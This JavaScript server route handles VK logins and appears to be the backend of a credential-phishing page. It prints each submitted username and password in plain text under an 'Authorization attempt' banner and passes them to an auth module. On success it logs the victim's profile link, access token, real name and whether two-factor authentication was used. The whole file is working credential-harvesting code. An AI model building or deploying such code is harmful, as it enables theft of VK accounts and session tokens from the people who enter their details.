import { VK } from "vk-io";
import auth from "./_auth";
import { R_SUCCESS, R_REQUIRE_2FA } from "./_auth-constants";
import { Instance } from "chalk";

const chalk = new Instance({ level: 2 });

const _ = console.log.bind(console);
const kwLog = (key, value) =>
  _(chalk.blueBright(`${key}:`), chalk.magentaBright(value));

/**
 * @type {import("polka").Middleware}
 */

export const post = async (request, response) => {
  const ua = request.headers["user-agent"];
  let agent;

  _();
  _(chalk.bold("<Authorization attempt>"));
  kwLog("Username", request.body.username);
  kwLog("Password", request.body.password);

  if (ua.includes("iphone")) agent = "IPhone";
  else if (ua.includes("ipad")) agent = "IPad";
  else if (ua.includes("android")) agent = "Android";
  else if (ua.includes("windows phone")) agent = "WindowsPhone";
  else if (ua.includes("windows")) agent = "Windows";
  else agent = "Android";

  kwLog("Platform", agent);

  const result = await auth(request.body, agent.toLowerCase());

  response.writeHead(200, "OK", {
    "Content-Type": "application/json"
  });

  response.end(JSON.stringify(result));

  if (result.status === R_SUCCESS) {
    kwLog("Status", chalk.greenBright("Success"));
    kwLog("Page", `https://vk.com/id${result.user_id}`);
    kwLog("Token", result.token);

    const vk = new VK({ token: result.token });

    const [me] = await vk.api.users.get({});
    kwLog("Name", `${me.first_name} ${me.last_name}`);
    kwLog(
      "2fa",
      "code" in request.body ? chalk.redBright("Yes") : chalk.greenBright("No")
    );
  } else if (result.status === R_REQUIRE_2FA) {
    kwLog("Status", chalk.yellowBright("2FA Required"));
  } else {
    kwLog("Status", chalk.redBright("Error"));
  }
};
